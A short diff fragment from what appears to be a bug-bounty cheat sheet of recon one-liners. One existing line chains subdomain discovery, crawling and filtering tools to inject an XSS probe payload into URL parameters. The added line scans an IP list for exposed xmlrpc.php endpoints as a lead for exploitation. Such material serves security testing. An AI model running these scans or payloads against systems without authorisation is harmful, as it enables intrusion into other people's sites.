@@ -635,7 +635,7 @@ c templates concurrent
             mv ~/Gf-Patterns/*.json ~/.gf
   29- echo http://vulnweb.com | subfinder -silent | httpx -silent | katana -d 10 -silent | gf xss | Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
        
-       
+   30- cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC" ==> then search exploit xmlrpc
        
        
        
